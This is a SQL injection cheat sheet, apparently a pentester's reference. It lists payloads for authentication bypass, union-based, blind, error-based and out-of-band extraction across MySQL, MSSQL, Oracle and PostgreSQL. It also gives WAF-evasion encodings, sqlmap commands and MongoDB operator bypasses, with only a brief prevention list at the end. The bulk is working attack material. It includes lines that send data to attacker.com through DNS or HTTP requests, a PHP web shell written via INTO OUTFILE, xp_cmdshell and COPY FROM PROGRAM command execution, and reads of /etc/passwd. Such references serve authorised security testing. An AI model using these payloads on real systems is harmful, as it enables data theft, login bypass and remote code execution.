# SQL Injection Cheat Sheet

## Detection

```sql
# Test for SQL injection
'
"
`
')
")
`)
'))
"))
`))
```

---

## Authentication Bypass

```sql
# Basic bypass
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'#
admin'--
admin'#
admin' OR 1=1--
' OR 1=1--
' OR '1'='1'--
' OR ''='
' OR 1=1#

# With username
admin' OR '1'='1
admin' OR 1=1--
admin' OR 1=1#
admin'/*
admin' OR '1'='1'/*

# No username
' OR 1=1--
' OR '1'='1'--
' OR 1=1#
'OR 1#
```

---

## Union-Based SQL Injection

### Determine number of columns

```sql
# ORDER BY technique
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# Continue until error

# UNION SELECT technique
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
# Continue until no error
```

### Find injectable columns

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### Extract data

```sql
# MySQL
' UNION SELECT NULL,NULL,version()--
' UNION SELECT NULL,database(),user()--
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,username,password FROM users--

# MSSQL
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,DB_NAME(),NULL--
' UNION SELECT NULL,name,NULL FROM sys.databases--
' UNION SELECT NULL,name,NULL FROM sys.tables--
' UNION SELECT NULL,name,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')--

# Oracle
' UNION SELECT NULL,banner,NULL FROM v$version--
' UNION SELECT NULL,table_name,NULL FROM all_tables--
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

# PostgreSQL
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,current_database(),NULL--
' UNION SELECT NULL,tablename,NULL FROM pg_tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

---

## Boolean-Based Blind SQL Injection

```sql
# Test true/false conditions
' AND '1'='1    # True
' AND '1'='2    # False

' AND 1=1--     # True
' AND 1=2--     # False

# Extract database name length
' AND LENGTH(database())=1--
' AND LENGTH(database())=2--
# Continue until true

# Extract database name character by character
' AND SUBSTRING(database(),1,1)='a'--
' AND SUBSTRING(database(),1,1)='b'--
# Continue for each position

# Extract data
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
```

---

## Time-Based Blind SQL Injection

### MySQL

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(LENGTH(database())=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

# Using BENCHMARK
' AND BENCHMARK(10000000,MD5('test'))--
```

### MSSQL

```sql
'; WAITFOR DELAY '00:00:05'--
'; IF (1=1) WAITFOR DELAY '00:00:05'--
'; IF (LEN(DB_NAME())=5) WAITFOR DELAY '00:00:05'--
```

### PostgreSQL

```sql
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### Oracle

```sql
' AND dbms_pipe.receive_message(('a'),5)--
```

---

## Error-Based SQL Injection

### MySQL

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--

' AND extractvalue(1,concat(0x7e,(SELECT version())))--

' AND updatexml(1,concat(0x7e,(SELECT version())),1)--
```

### MSSQL

```sql
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))--
```

### PostgreSQL

```sql
' AND 1=CAST(version() AS int)--
```

---

## Out-of-Band SQL Injection

### MySQL

```sql
# Load file to remote server
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\a'))--

# DNS exfiltration
' UNION SELECT NULL,LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))--
```

### MSSQL

```sql
# DNS exfiltration
'; EXEC master..xp_dirtree '\\attacker.com\'+@@version+'\'--
'; EXEC master..xp_subdirs '\\attacker.com\'+DB_NAME()+'\'--

# HTTP request
'; EXEC master..xp_cmdshell 'nslookup '+@@version+'.attacker.com'--
```

### Oracle

```sql
# UTL_HTTP
' UNION SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT version FROM v$instance)) FROM dual--

# UTL_INADDR
' UNION SELECT UTL_INADDR.get_host_address((SELECT version FROM v$instance)||'.attacker.com') FROM dual--
```

---

## Database-Specific Payloads

### MySQL

```sql
# Version
SELECT @@version;
SELECT version();

# Current database
SELECT database();

# Current user
SELECT user();
SELECT current_user();

# List databases
SELECT schema_name FROM information_schema.schemata;

# List tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database();

# List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users';

# Read file
SELECT LOAD_FILE('/etc/passwd');

# Write file
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# Command execution (if xp_cmdshell equivalent exists)
```

### MSSQL

```sql
# Version
SELECT @@version;

# Current database
SELECT DB_NAME();

# Current user
SELECT user_name();
SELECT system_user;

# List databases
SELECT name FROM sys.databases;

# List tables
SELECT name FROM sys.tables;

# List columns
SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users');

# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Command execution
EXEC xp_cmdshell 'whoami';

# Read file
EXEC xp_cmdshell 'type C:\Windows\win.ini';

# Linked servers
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
```

### Oracle

```sql
# Version
SELECT banner FROM v$version;
SELECT version FROM v$instance;

# Current database
SELECT ora_database_name FROM dual;
SELECT name FROM v$database;

# Current user
SELECT user FROM dual;

# List tables
SELECT table_name FROM all_tables;
SELECT owner,table_name FROM all_tables;

# List columns
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';

# Command execution (Java)
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c dir') FROM dual;

# DNS exfiltration
SELECT UTL_INADDR.get_host_address('attacker.com') FROM dual;
```

### PostgreSQL

```sql
# Version
SELECT version();

# Current database
SELECT current_database();

# Current user
SELECT current_user;

# List databases
SELECT datname FROM pg_database;

# List tables
SELECT tablename FROM pg_tables WHERE schemaname='public';

# List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users';

# Read file
CREATE TABLE temp(data text);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;

# Command execution
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'whoami';
SELECT * FROM cmd_exec;

# Or use pg_read_file
SELECT pg_read_file('/etc/passwd');
```

---

## Second-Order SQL Injection

```sql
# Registration
Username: admin'--

# Later query uses this username
SELECT * FROM users WHERE username='admin'--'
# Comment bypasses password check
```

---

## Bypassing WAF/Filters

```sql
# Case manipulation
SeLeCt * FrOm users

# Comments
SELECT/**/username/**/FROM/**/users

# URL encoding
%27%20OR%20%271%27%3D%271

# Double URL encoding
%2527%2520OR%2520%25271%2527%253D%25271

# Unicode encoding
%u0027%u0020OR%u0020%u0027%u0031%u0027%u003D%u0027%u0031

# Hex encoding
0x27204F522027312027003D202731

# Spaces
SELECT+username+FROM+users
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  # Tab
SELECT%0Ausername%0AFROM%0Ausers  # Newline

# OR keyword bypass
||
' OR '1'='1
' || '1'='1
' OR 1#
' OR 1=1#

# UNION keyword bypass
UNION ALL SELECT
UniOn SeLeCt
/**/UNION/**/SELECT/**/

# Quote bypass
' OR 1=1--
admin'--
' OR '1'='1
```

---

## SQLMap

```bash
# Basic usage
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=admin"

# Request file
sqlmap -r request.txt

# List databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Current database
sqlmap -u "http://target.com/page?id=1" --current-db

# List tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump table
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# Dump all
sqlmap -u "http://target.com/page?id=1" -D database_name --dump-all

# Shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# Forms
sqlmap -u "http://target.com" --forms --crawl=2

# Batch mode
sqlmap -u "http://target.com/page?id=1" --batch

# Custom injection point
sqlmap -u "http://target.com/page" --data="id=1*&submit=Submit"

# Cookie injection
sqlmap -u "http://target.com/page" --cookie="id=1*"

# Header injection
sqlmap -u "http://target.com/page" --headers="X-Forwarded-For: 1*"

# Risk and level
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# Tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between
```

---

## NoSQL Injection

### MongoDB

```javascript
# Authentication bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}

# URL format
username[$ne]=admin&password[$ne]=pass

# Extract data
{"username": {"$regex": "^a"}}
{"username": {"$regex": "^ad"}}
# Continue to build username
```

---

## Prevention

1. **Parameterized Queries / Prepared Statements**
2. **Stored Procedures**
3. **Input Validation**
4. **Principle of Least Privilege**
5. **WAF (Web Application Firewall)**
6. **Escape Special Characters**
7. **Disable Error Messages in Production**
8. **Regular Security Audits**

---

## Resources

- PayloadsAllTheThings SQL Injection
- PortSwigger SQL Injection Guide
- PentestMonkey SQL Injection Cheat Sheet
- OWASP SQL Injection Guide
